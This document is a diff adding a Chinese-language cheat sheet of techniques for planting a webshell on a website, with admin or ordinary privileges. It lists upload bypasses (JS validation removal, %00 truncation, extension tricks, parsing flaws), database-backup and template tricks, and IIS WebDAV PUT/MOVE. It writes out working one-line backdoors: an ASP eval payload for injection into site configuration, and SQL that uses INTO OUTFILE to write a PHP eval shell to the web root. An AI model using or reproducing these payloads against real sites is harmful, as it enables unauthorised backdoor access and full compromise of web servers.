@@ -1,0 +1,44 @@
+管理权限拿webshell
+1.upload，直接上传大马（分有无密码）
+2.数据库备份拿webshell，先按允许上传的文件上传（如jpg、gif）
+然后找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式
+3.本地js验证突破拿webshell，删除js验证、抓包改包等都行
+4.其他脚本类型拿webshell，适用于一台服务器有多个网站，不同语言写的
+后端的站点；比如拥有php的站点和asp的站点，可以上传php脚本到asp站点；
+其次，可以尝试将脚本文件后缀名改为asa或者在后面直接加个.来突破文件类型
+限制进行上传拿webshell
+5.00截断拿webshell，看到这个就懂了————xx.asp%00.jpg
+6.利用解析漏洞拿webshell（直接看上传文件漏洞笔记）
+7.网站配置插马拿webshell，将一句话插入网站配置中，注意网站过滤规则
+"%><%eval request("cracer")%><%'
+8.通过编辑模板拿webshell，对网站进行编辑写入一句话，然后生成脚本文件拿webshell；
+将木马添加到压缩文件，把名字改成网站模板类型，上传到网站服务器，拿webshell
+9.数据库命令执行拿webshell，phpmyadmin登录数据库命令来写一句话拿webshell
+
+create TABLE study (cmd text NOT NULL);
+Insert INTO study (cmd) VALUES('<?php eval($_POST[cmd])?>');
+select cmd from study into outfile 'D:/php/www/htdocs/test/seven.php';
+Drop TABLE IF EXISTS study;
+
+10.文件包含拿webshell，具体参照文件包含漏洞
+asp:
+<!--#include file="123.jpg"-->
+不在同一目录，用下面的语句：
+<!--#include virtual="文件所在目录/123.jpg"-->
+php
+<?php include('123.jpg');?>
+
+11.另类拿webshell
+1.更新页面拿webshell
+2.上传插件拿webshell
+
+普通权限拿webshell
+1，0day拿webshell，一些软件来直接getshell
+2，修改网站上传类型配置拿webshell
+3.开启webdva，运用iis写权限的工具
+有iis写入权限的网站，put进去一个带有木马代码的txt文件，
+目录要有可写的权限，通过move，把txt转化为脚本文件
+
+4.远程命令执行拿webshell
+命令执行多出于php程序
+
